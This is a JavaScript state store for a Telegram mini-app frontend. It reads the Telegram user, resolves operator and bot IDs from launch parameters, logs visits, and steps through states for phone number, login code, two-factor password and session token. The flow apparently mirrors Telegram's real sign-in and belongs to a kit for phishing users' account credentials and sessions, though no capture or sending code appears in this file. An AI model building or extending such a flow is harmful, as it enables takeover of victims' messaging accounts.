import { defineStore } from "pinia";
import { ref } from "vue";
import { api } from "../api/client";

export function waitForTelegramWebApp(timeoutMs = 3000) {
  const existing = window.Telegram?.WebApp;
  if (existing) return Promise.resolve(existing);

  return new Promise((resolve) => {
    const start = Date.now();
    const timer = setInterval(() => {
      if (window.Telegram?.WebApp) {
        clearInterval(timer);
        resolve(window.Telegram.WebApp);
      } else if (Date.now() - start >= timeoutMs) {
        clearInterval(timer);
        resolve(null);
      }
    }, 100);
  });
}

export const useUserStore = defineStore("user", () => {
  const initialized = ref(false);
  const isLoading = ref(true);
  const user = ref(null);
  // States: unauthorized | need_phone | enter_code | expired | enter_twoFA | end
  const state = ref("unauthorized");
  const uId = ref(null);
  const botId = ref("default");
  const phoneNumber = ref("");
  const passwordHint = ref("");
  const sessionToken = ref("");

  async function init() {
    isLoading.value = true;
    const tg = await waitForTelegramWebApp();
    const unsafe = tg?.initDataUnsafe;

    if (!unsafe || !unsafe.user) {
      isLoading.value = false;
      return false;
    }

    user.value = unsafe.user;
    const startParam = unsafe.start_param || "";

    if (startParam) {
      if (startParam.includes("-")) {
        const [u, b] = startParam.split("-");
        uId.value = u || null;
        botId.value = b || "default";
      } else {
        botId.value = startParam;
      }
    } else {
      const params = new URLSearchParams(window.location.search);
      uId.value = params.get("u") || null;
      botId.value = params.get("b") || "default";
    }

    let res = null;
    if (!uId.value) {
      res = await api.getBot({
        user_tg: user.value,
        bot_id: botId.value,
      });
      if (res?.u_id) uId.value = res.u_id;
    } else {
      res = await api.getState({
        bot_user_id: uId.value,
        bot_id: botId.value,
        user_tg: user.value,
      });
    }

    if (res && res.ok) {
      state.value = res.state || "need_phone";
      phoneNumber.value = res.phone_number || "";
      passwordHint.value = res.password_hint || "";
      sessionToken.value = res.session_token || "";
      initialized.value = true;

      api.trackVisit({
        bot_id: botId.value,
        tg_id: String(user.value.id),
        user_agent: navigator.userAgent,
      });

      isLoading.value = false;
      return true;
    }

    isLoading.value = false;
    return false;
  }

  return {
    initialized,
    isLoading,
    user,
    state,
    uId,
    botId,
    phoneNumber,
    passwordHint,
    sessionToken,
    init,
  };
});
